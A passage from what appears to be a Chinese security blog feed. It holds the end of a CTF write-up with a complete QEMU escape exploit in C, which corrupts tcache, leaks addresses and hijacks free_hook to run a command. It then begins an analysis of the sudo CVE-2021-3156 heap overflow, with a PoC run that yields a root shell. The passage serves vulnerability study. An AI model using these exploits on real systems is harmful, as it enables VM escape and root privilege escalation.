function_">set_idx</span><span class="params">(<span class="type">uint32_t</span> idx)</span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0xc</span>, idx, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">handle_data_read</span><span class="params">()</span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_req</span><span class="params">(<span class="type">uint32_t</span> size)</span>&#123;</span><br><span class="line">    set_size(size);</span><br><span class="line">    mmio_write(<span class="number">0x14</span>, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_req</span><span class="params">()</span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x18</span>, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">handle_data_write</span><span class="params">()</span>&#123;</span><br><span class="line">    mmio_read(<span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    system( <span class="string">&quot;mknod -m 660 /dev/mem c 1 1&quot;</span> );</span><br><span class="line"></span><br><span class="line">    mmio_mem = mem_map(<span class="string">&quot;/dev/mem&quot;</span>, mmio_addr, mmio_size);</span><br><span class="line">    <span class="keyword">if</span> (!mmio_mem)&#123;</span><br><span class="line">        die(<span class="string">&quot;mmio or vga mmap failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span>* buf = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!buf)&#123;</span><br><span class="line">        die(<span class="string">&quot;mmap failed\\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">uint64_t</span> physical_buf_address = gva_to_gpa(buf);</span><br><span class="line">    create_req(<span class="number">2</span>);</span><br><span class="line">    set_result_addr(mmio_addr+<span class="number">0x18</span>);</span><br><span class="line">    set_idx(<span class="number">2</span>);</span><br><span class="line">    set_addr(physical_buf_address);</span><br><span class="line">    <span class="comment">// handle_data_write为读取数据，handle_data_read为写入数据</span></span><br><span class="line">    handle_data_write();</span><br><span class="line">    <span class="type">uint64_t</span> req_address = *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x800</span>) - <span class="number">0x410</span>*<span class="number">2</span>;</span><br><span class="line">    <span class="type">uint64_t</span> tcache_entry_address = *(<span class="type">uint64_t</span> *)(buf + <span class="number">0x808</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;req: %p\\ntcache entry: %p\\n&quot;</span>, req_address, tcache_entry_address);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    create_req(<span class="number">2</span>);</span><br><span class="line">    set_result_addr(mmio_addr + <span class="number">0x18</span>);</span><br><span class="line">    set_idx(<span class="number">1</span>);</span><br><span class="line">    set_addr(physical_buf_address);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint64_t</span>*)(buf + <span class="number">0x400</span>) = req_address;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(buf + <span class="number">0x408</span>) = tcache_entry_address;</span><br><span class="line">    handle_data_read();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;tcache chain has been changed\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">// req-&gt;list[2]=req</span></span><br><span class="line">    create_req(<span class="number">2</span>);</span><br><span class="line">    set_result_addr(mmio_addr);</span><br><span class="line">    set_idx(<span class="number">2</span>);</span><br><span class="line">    set_addr(physical_buf_address);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint64_t</span>*)(buf + <span class="number">0x800</span>) = <span class="number">0x800</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(buf + <span class="number">0x808</span>) = tcache_entry_address + <span class="number">0x788</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(buf + <span class="number">0x810</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(buf + <span class="number">0x818</span>) = req_address;</span><br><span class="line">    <span class="comment">// 覆写req-&gt;list[0]=tcache_entry+offset</span></span><br><span class="line">    handle_data_read();</span><br><span class="line">    set_idx(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 读取tcache entry中残留数据泄漏得到proc base</span></span><br><span class="line">    handle_data_write();</span><br><span class="line">    <span class="type">uint64_t</span> proc_address = *(<span class="type">uint64_t</span> *)buf - <span class="number">0xa700a0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;proc base: %p\\n&quot;</span>, proc_address);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">// 设置req-&gt;list[0]为puts got</span></span><br><span class="line">    set_idx(<span class="number">2</span>);</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(buf + <span class="number">0x800</span>) = <span class="number">0x800</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(buf + <span class="number">0x808</span>) = proc_address + elf_puts_got;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(buf + <span class="number">0x810</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(buf + <span class="number">0x818</span>) = req_address;</span><br><span class="line"></span><br><span class="line">    handle_data_read();</span><br><span class="line">    set_idx(<span class="number">0</span>);</span><br><span class="line">    handle_data_write();</span><br><span class="line">    <span class="type">uint64_t</span> libc_address = *(<span class="type">uint64_t</span>*)buf - libc_puts_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc address: %p\\n&quot;</span>, libc_address);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">// 覆写req-&gt;list[0] 为free_hook-0x10</span></span><br><span class="line">    set_idx(<span class="number">2</span>);</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(buf + <span class="number">0x800</span>) = <span class="number">0x800</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(buf + <span class="number">0x808</span>) = libc_address + libc_free_hook_offset - <span class="number">0x10</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(buf + <span class="number">0x810</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(buf + <span class="number">0x818</span>) = req_address;</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    handle_data_read();</span><br><span class="line">    set_idx(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(buf + <span class="number">0x10</span>) = libc_system_offset + libc_address;</span><br><span class="line">    handle_data_read();</span><br><span class="line"></span><br><span class="line">    delete_req();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://ama2in9.top/2021/01/15/rwctf2020/#more">RealWorld CTF 2020 EasyEscape题解</a></p><p><a href="https://ctftime.org/writeup/25671">Real World CTF 3rd - Esay Escape</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3156 sudo heap-based bufoverflow 复现&amp;分析</title>
      <link href="/posts/4199921919.html"/>
      <url>/posts/4199921919.html</url>
      
        <content type="html"><![CDATA[<p>文章首发于安全客</p><p><a href="https://www.anquanke.com/post/id/231408">CVE-2021-3156 sudo heap-based bufoverflow 复现&amp;分析</a></p><p><code>CVE-2021-3156</code>是<code>sudo</code>的一个堆溢出漏洞，可以用来进行本地提权。在类<code>uninx</code>中非<code>root</code>可以使用<code>sudo</code>来以<code>root</code>的权限执行操作。由于<code>sudo</code>错误的转义了<code>\\</code>导致了一个堆溢出漏洞。</p><p>漏洞影响版本为<code>1.8.2-1.8.31sp12, 1.9.0-1.9.5sp1</code>，<code>sudo &gt;=1.9.5sp2</code>的版本则不受影响。</p><p>感谢<code>luc</code>师傅带我飞。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里我首先使用的是<code>docker ubuntu 20.04</code>，查看一下<code>sudo</code>版本，这里需要注意的是首先需要创建一个普通权限的用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$ sudo --version</span><br><span class="line">Sudo version 1.8.31</span><br><span class="line">Sudoers policy plugin version 1.8.31</span><br><span class="line">Sudoers file grammar version 46</span><br><span class="line">Sudoers I/O plugin version 1.8.31</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行命令<code>sudoedit -s /</code>如果回显</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@c957df720fc7:~/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty<span class="comment"># sudoedit -s /</span></span><br><span class="line">sudoedit: /: not a regular file</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>则表明存在漏洞，如果回显</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  work sudoedit -s /</span><br><span class="line">usage: sudoedit [-AknS] [-r role] [-t <span class="built_in">type</span>] [-C num] [-g group] [-h host] [-p prompt] [-T <span class="built_in">timeout</span>] [-u user] file ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>则表示漏洞已经被修复</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先我们使用<a href="https://github.com/blasty/CVE-2021-3156">exp</a>先执行一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@c957df720fc7:~/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty<span class="comment"># su normal</span></span><br><span class="line">normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$ <span class="built_in">ls</span></span><br><span class="line">Makefile  README.md  hax.c  lib.c  libnss_X  sudo-hax-me-a-sandwich</span><br><span class="line">normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$ make</span><br><span class="line"><span class="built_in">rm</span> -rf libnss_X</span><br><span class="line"><span class="built_in">mkdir</span> libnss_X</span><br><span class="line">gcc -o sudo-hax-me-a-sandwich hax.c</span><br><span class="line">gcc -fPIC -shared -o <span class="string">&#x27;libnss_X/P0P_SH3LLZ_ .so.2&#x27;</span> lib.c</span><br><span class="line">normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$ ./sudo-hax-me-a-sandwich 1</span><br><span class="line"></span><br><span class="line">** CVE-2021-3156 PoC by blasty &lt;peter@haxx.in&gt;</span><br><span class="line"></span><br><span class="line">using target: <span class="string">&#x27;Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31&#x27;</span></span><br><span class="line">** pray <span class="keyword">for</span> your rootshell.. **</span><br><span class="line">[+] bl1ng bl1ng! We got it!</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),1000(normal)</span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">normal@c957df720fc7:/root/pwn/漏洞/CVE-2021-3156/CVE-2021-3156_blasty$</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当<code>sudo</code>以<code>-i,-s</code>参数启动即<code>MODE_SHELL,MODE_LOGIN_SHELl</code>标志启动的时候，<code>sudo</code>会使用<code>\\</code>转义所有的元字符，并重写<code>argc,argv</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//src/parse_args.c/parse_args</span></span><br><span class="line"><span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;</span><br><span class="line">  <span class="type">char</span> **av, *cmnd = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">int</span> ac = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* shell -c &quot;command&quot; */</span></span><br><span class="line">    <span class="type">char</span> *src, *dst;</span><br><span class="line">    <span class="type">size_t</span> cmnd_size = (<span class="type">size_t</span>) (argv[argc - <span class="number">1</span>] - argv[<span class="number">0</span>]) +</span><br><span class="line">      <span class="built_in">strlen</span>(argv[argc - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    cmnd = dst = reallocarray(<span class="literal">NULL</span>, cmnd_size, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (cmnd == <span class="literal">NULL</span>)</span><br><span class="line">      sudo_fatalx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (!gc_add(GC_PTR, cmnd))</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (av = argv; *av != <span class="literal">NULL</span>; av++) &#123;<span class="comment">// 串联所有的命令参数字符串</span></span><br><span class="line">      <span class="keyword">for</span> (src = *av; *src != <span class="string">&#x27;\\0&#x27;</span>; src++) &#123;</span><br><span class="line">        <span class="comment">/* quote potential meta characters */</span></span><br><span class="line">        <span class="comment">// 用\\转义所有的元字符</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">isalnum</span>((<span class="type">unsigned</span> <span class="type">char</span>)*src) &amp;&amp; *src != <span class="string">&#x27;_&#x27;</span> &amp;&amp; *src != <span class="string">&#x27;-&#x27;</span> &amp;&amp; *src != <span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">          *dst++ = <span class="string">&#x27;\\\\&#x27;</span>;</span><br><span class="line">        *dst++ = *src;</span><br><span class="line">      &#125;</span><br><span class="line">      *dst++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (cmnd != dst)</span><br><span class="line">      dst--;  <span class="comment">/* replace last space with a NUL */</span></span><br><span class="line">    *dst = <span class="string">&#x27;\\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    ac += <span class="number">2</span>; <span class="comment">/* -c cmnd */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 重写argc，argv</span></span><br><span class="line">  av = reallocarray(<span class="literal">NULL</span>, ac + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="type">char</span> *));</span><br><span class="line">  <span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">    sudo_fatalx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line">  <span class="keyword">if</span> (!gc_add(GC_PTR, av))</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  av[<span class="number">0</span>] = (<span class="type">char</span> *)user_details.shell; <span class="comment">/* plugin may override shell */</span></span><br><span class="line">  <span class="keyword">if</span> (cmnd != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    av[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">    av[<span class="number">2</span>] = cmnd;</span><br><span class="line">  &#125;</span><br><span class="line">  av[ac] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  argv = av;</span><br><span class="line">  argc = ac;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后会在<code>sudoers_policy_main</code>函数中调用<code>set_cmnd</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//plugins/sudoers/sudoers.c</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">  <span class="title function_">sudoers_policy_main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * <span class="type">const</span> argv[], <span class="type">int</span> pwflag, <span class="type">char</span> *env_add[],</span></span><br><span class="line"><span class="params">                      <span class="type">bool</span> verbose, <span class="type">void</span> *closure)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="comment">/* Find command in path and apply per-command Defaults. */</span></span><br><span class="line">  cmnd_status = set_cmnd();</span><br><span class="line">  <span class="keyword">if</span> (cmnd_status == NOT_FOUND_ERROR)</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">  <span class="title function_">set_cmnd</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="keyword">if</span> (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123;</span><br><span class="line"></span><br><span class="line"> <span class="number">847</span>         <span class="keyword">if</span> (NewArgc &gt; <span class="number">1</span>) &#123;</span><br><span class="line"> <span class="number">848</span>             <span class="type">char</span> *to, *from, **av;</span><br><span class="line"> <span class="number">849</span>             <span class="type">size_t</span> size, n;</span><br><span class="line"> <span class="number">850</span></span><br><span class="line"> <span class="number">851</span>             <span class="comment">/* Alloc and build up user_args. */</span></span><br><span class="line"> <span class="number">852</span>             <span class="keyword">for</span> (size = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++)</span><br><span class="line"> <span class="number">853</span>                 size += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>;</span><br><span class="line"> <span class="number">854</span>             <span class="keyword">if</span> (size == <span class="number">0</span> || (user_args = <span class="built_in">malloc</span>(size)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line"> <span class="number">855</span>                 sudo_warnx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line"> <span class="number">856</span>                 debug_return_int(<span class="number">-1</span>);</span><br><span class="line"> <span class="number">857</span>             &#125;</span><br><span class="line"> <span class="number">858</span>             <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line"> <span class="number">859</span>                 <span class="comment">/*</span></span><br><span class="line"><span class="comment"> 860                  * When running a command via a shell, the sudo front-end</span></span><br><span class="line"><span class="comment"> 861                  * escapes potential meta chars.  We unescape non-spaces</span></span><br><span class="line"><span class="comment"> 862                  * for sudoers matching and logging purposes.</span></span><br><span class="line"><span class="comment"> 863                  */</span></span><br><span class="line"> <span class="number">864</span>                 <span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line"> <span class="number">865</span>                     <span class="keyword">while</span> (*from) &#123;</span><br><span class="line"> <span class="number">866</span>                         <span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">&#x27;\\\\&#x27;</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="type">unsigned</span> <span class="type">char</span>)from[<span class="number">1</span>]))</span><br><span class="line"> <span class="number">867</span>                             from++;</span><br><span class="line"> <span class="number">868</span>                         *to++ = *from++;</span><br><span class="line"> <span class="number">869</span>                     &#125;</span><br><span class="line"> <span class="number">870</span>                     *to++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"> <span class="number">871</span>                 &#125;</span><br><span class="line"> <span class="number">872</span>                 *--to = <span class="string">&#x27;\\0&#x27;</span>;</span><br><span class="line"> <span class="number">873</span>             &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="number">874</span>                 <span class="comment">//...</span></span><br><span class="line"> <span class="number">885</span>         &#125;</span><br><span class="line"> <span class="number">886</span>     &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从代码中我们可以看出，函数首先按照<code>argv</code>中参数的大小申请一块堆空间<code>user_args</code>，然后依次将命令行参数链接到该堆空间中。</p><p>但是如果当一个命令行参数以反斜杠结尾，即<code>from[0]=\\,from[1]=null</code>，就会满足<code>866</code>行的条件，使得<code>from++</code>指向<code>null</code>，但是之后<code>868</code>行执行的拷贝操作又会使得<code>from++</code>从而越过了<code>null</code>，那么接下来的<code>while</code>循环就会发生越界拷贝。拷贝的内容将会复制到<code>user_args</code>堆块中，从而发生堆溢出。</p><p>但是理论在设置了<code>MODE_SHELL,MODE_LOGIN_SHELL</code>的条件下任何命令行参数都不可能以<code>\\</code>结尾，因为其在<code>parse_args</code>函数中会对所有的元字符进行转义包括这个<code>\\</code>。</p><p>但是这两个函数中的判断条件有所不同</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//parse_args</span></span><br><span class="line"><span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL))&#123;&#125;</span><br><span class="line"><span class="comment">//sudoers_policy_main</span></span><br><span class="line"><span class="keyword">if</span> (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL))&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么如果我们想要成功的利用堆溢出就需要在设置<code>flags=MODE_SHELL/MODE_LOGIN_SHELL</code>的条件下而不设置<code>mode=MODE_RUN</code>以避免转移代码的执行。那么根据<code>sudoers_policy_main</code>中的条件，我们只能设置<code>MODE_EDIT | MODE_CHECK</code>这两个标志位了，来看一下设置的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> (mode &amp;&amp; mode != MODE_EDIT)</span><br><span class="line">usage_excl(<span class="number">1</span>);</span><br><span class="line">    mode = MODE_EDIT;</span><br><span class="line">    sudo_settings[ARG_SUDOEDIT].value = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    valid_flags = MODE_NONINTERACTIVE;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> (mode) &#123;</span><br><span class="line"><span class="keyword">if</span> (mode == MODE_LIST)</span><br><span class="line">    SET(flags, MODE_LONG_LIST);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    usage_excl(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mode = MODE_LIST;</span><br><span class="line">    valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &gt; <span class="number">0</span> &amp;&amp; mode == MODE_LIST)</span><br><span class="line">mode = MODE_CHECK;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是如果我们设置了这两个标志位，并且设置了<code>MODE_SHELL/MODE_LOGIN_SHELL</code>的话，在后续会被检测到并退出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((flags &amp; valid_flags) != flags)</span><br><span class="line">  usage(1);// Give usage message and <span class="built_in">exit</span>.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是当我们以<code>sudoedit</code>执行的时候</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (proglen &gt; 4 &amp;&amp; strcmp(progname + proglen - 4, <span class="string">&quot;edit&quot;</span>) == 0) &#123;</span><br><span class="line">  progname = <span class="string">&quot;sudoedit&quot;</span>;</span><br><span class="line">  mode = MODE_EDIT;</span><br><span class="line">  sudo_settings[ARG_SUDOEDIT].value = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里只会设置<code>mode = MODE_EDIT</code>，而并不会设置<code>valid_flags</code>，也就不会检测退出，我们就可以正常执行到堆溢出的部分。</p><p>这个漏洞是非常友好的，因为我们可以通过控制命令行参数从而控制<code>user_args</code>堆块申请的大小，溢出的内容以及溢出的长度。并且攻击者可以通过以反斜杠结尾的方式实现向目标地址写<code>0</code>。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="背景知识"><a href="#背景知识" class="headerlink" 